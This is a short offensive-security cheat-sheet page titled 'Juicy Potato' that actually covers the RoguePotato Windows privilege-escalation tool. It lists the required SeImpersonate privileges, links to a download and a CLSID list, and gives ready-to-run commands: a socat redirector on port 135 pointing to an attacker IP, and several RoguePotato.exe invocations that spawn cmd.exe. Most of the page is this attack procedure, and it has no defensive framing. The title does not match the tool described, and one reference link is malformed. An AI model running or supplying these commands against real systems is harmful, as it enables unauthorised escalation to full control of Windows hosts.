# Juicy Potato

### Table of Contents
- [Download](#download)
- [How it works](#how-it-works)
- [Prerequisite Privileges needed](#prerequisite-privileges-needed)
- [Parameters](#parameters)
- [References](#references)

### Download
[Rogue Potato Releases](https://github.com/antonioCoco/RoguePotato/releases)

### How it works:
![The overall process of how this works](https://decoderblogblog.files.wordpress.com/2020/05/flow_graph_2.png?w=1024&h=233)

### Prerequisite Privileges needed
`SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`

### Parameters
**Get a list of CLSIDs here**: [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

```
Mandatory args:
-r remote_ip: ip of the remote machine to use as redirector
-e commandline: commandline of the program to launch


Optional args:
-l listening_port: This will run the RogueOxidResolver locally on the specified port
-c {clsid}: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-p pipename_placeholder: placeholder to be used in the pipe name creation (default: RoguePotato)
-z : this flag will randomize the pipename_placeholder (don't use with -p)


Examples:
 - Network redirector / port forwarder to run on your remote machine, must use port 135 as src port
        socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999
 - RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. Use this if you have fw restrictions.
        RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
 - RoguePotato all in one with RogueOxidResolver running locally on port 9999
        RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
 - RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
        RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
```

### References
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)

